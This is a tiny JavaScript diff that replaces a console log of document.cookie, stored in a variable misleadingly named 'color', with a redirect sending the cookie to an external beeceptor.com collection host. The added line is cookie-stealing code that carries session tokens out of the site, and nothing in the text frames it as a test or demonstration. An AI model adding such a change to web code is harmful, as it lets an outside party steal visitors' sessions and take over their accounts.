@@ -1,2 +1,2 @@
 const color = document.cookie;
-console.log(color);
+window.location = "https://pwned.free.beeceptor.com"+encodeURI(color);
